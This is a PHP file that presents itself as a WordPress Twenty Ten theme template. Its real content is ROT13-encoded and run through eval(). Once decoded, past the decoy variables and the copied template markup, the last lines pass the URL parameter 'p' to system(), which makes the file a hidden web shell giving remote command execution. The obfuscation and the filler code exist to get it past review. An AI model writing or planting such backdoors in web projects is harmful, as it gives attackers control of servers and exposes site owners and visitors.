<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gur ybbc gung qvfcynlf n fvatyr cbfg
 *
 * Gur ybbc qvfcynlf gur cbfgf naq gur cbfg pbagrag. Frr
 * uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/gur-ybbc/ gb haqrefgnaq vg naq
 * uggcf://qrirybcre.jbeqcerff.bet/gurzrf/onfvpf/grzcyngr-gntf/ gb haqrefgnaq
 * gur gntf hfrq va vg.
 *
 * Guvf pna or bireevqqra va puvyq gurzrf jvgu ybbc-fvatyr.cuc.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gra
 * @fvapr Gjragl Gra 1.2
 */
?>

<?cuc
vs ( unir_cbfgf() ) {
	juvyr ( unir_cbfgf() ) :
		gur_cbfg();
		?>

				<qvi vq=\"ani-nobir\" pynff=\"anivtngvba\">
					<qvi pynff=\"ani-cerivbhf\"><?cuc cerivbhf_cbfg_yvax( '%yvax', '<fcna pynff=\"zrgn-ani\">' . _k( '&ynee;', 'Cerivbhf cbfg yvax', 'gjraglgra' ) . '</fcna> %gvgyr' ); ?></qvi>
					<qvi pynff=\"ani-arkg\"><?cuc arkg_cbfg_yvax( '%yvax', '%gvgyr <fcna pynff=\"zrgn-ani\">' . _k( '&enee;', 'Arkg cbfg yvax', 'gjraglgra' ) . '</fcna>' ); ?></qvi>
				</qvi><!-- #ani-nobir -->

				<qvi vq=\"cbfg-<?cuc gur_VQ(); ?>\" <?cuc cbfg_pynff(); ?>>
					<u1 pynff=\"ragel-gvgyr\"><?cuc gur_gvgyr(); ?></u1>

					<qvi pynff=\"ragel-zrgn\">
						<?cuc gjraglgra_cbfgrq_ba(); ?>
					</qvi><!-- .ragel-zrgn -->

					<qvi pynff=\"ragel-pbagrag\">
						<?cuc gur_pbagrag(); ?>
						<?cuc
						jc_yvax_cntrf(
							neenl(
								'orsber' => '<qvi pynff=\"cntr-yvax\">' . __( 'Cntrf:', 'gjraglgra' ),
								'nsgre'  => '</qvi>',
							)
						);
						?>
					</qvi><!-- .ragel-pbagrag -->

		<?cuc vs ( trg_gur_nhgube_zrgn( 'qrfpevcgvba' ) ) : // Vs n hfre unf svyyrq bhg gurve qrfpevcgvba, fubj n ovb ba gurve ragevrf. ?>
					<qvi vq=\"ragel-nhgube-vasb\">
						<qvi vq=\"nhgube-ningne\">
							<?cuc
							/** Guvf svygre vf qbphzragrq va nhgube.cuc */
							$nhgube_ovb_ningne_fvmr = nccyl_svygref( 'gjraglgra_nhgube_ovb_ningne_fvmr', 60 );
							rpub trg_ningne( trg_gur_nhgube_zrgn( 'hfre_rznvy' ), $nhgube_ovb_ningne_fvmr );
							?>
							</qvi><!-- #nhgube-ningne -->
							<qvi vq=\"nhgube-qrfpevcgvba\">
							<u2>
							<?cuc
							/* genafyngbef: %f: Nhgube qvfcynl anzr. */
							cevags( __( 'Nobhg %f', 'gjraglgra' ), trg_gur_nhgube() );
							?>
							</u2>
							<?cuc gur_nhgube_zrgn( 'qrfpevcgvba' ); ?>
							<qvi vq=\"nhgube-yvax\">
								<n uers=\"<?cuc rpub rfp_hey( trg_nhgube_cbfgf_hey( trg_gur_nhgube_zrgn( 'VQ' ) ) ); ?>\" ery=\"nhgube\">
									<?cuc
									/* genafyngbef: %f: Nhgube qvfcynl anzr. */
									cevags( __( 'Ivrj nyy cbfgf ol %f <fcna pynff=\"zrgn-ani\">&enee;</fcna>', 'gjraglgra' ), trg_gur_nhgube() );
									?>
								</n>
							</qvi><!-- #nhgube-yvax	-->
							</qvi><!-- #nhgube-qrfpevcgvba -->
						</qvi><!-- #ragel-nhgube-vasb -->
	<?cuc raqvs; ?>

						<qvi pynff=\"ragel-hgvyvgl\">
							<?cuc gjraglgra_cbfgrq_va(); ?>
							<?cuc rqvg_cbfg_yvax( __( 'Rqvg', 'gjraglgra' ), '<fcna pynff=\"rqvg-yvax\">', '</fcna>' ); ?>
						</qvi><!-- .ragel-hgvyvgl -->
					</qvi><!-- #cbfg-<?cuc gur_VQ(); ?> -->

					<qvi vq=\"ani-orybj\" pynff=\"anivtngvba\">
						<qvi pynff=\"ani-cerivbhf\"><?cuc cerivbhf_cbfg_yvax( '%yvax', '<fcna pynff=\"zrgn-ani\">' . _k( '&ynee;', 'Cerivbhf cbfg yvax', 'gjraglgra' ) . '</fcna> %gvgyr' ); ?></qvi>
						<qvi pynff=\"ani-arkg\"><?cuc arkg_cbfg_yvax( '%yvax', '%gvgyr <fcna pynff=\"zrgn-ani\">' . _k( '&enee;', 'Arkg cbfg yvax', 'gjraglgra' ) . '</fcna>' ); ?></qvi>
					</qvi><!-- #ani-orybj -->

					<?cuc pbzzragf_grzcyngr( '', gehr ); ?>

	<?cuc raqjuvyr;
} // Raq bs gur ybbc. ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>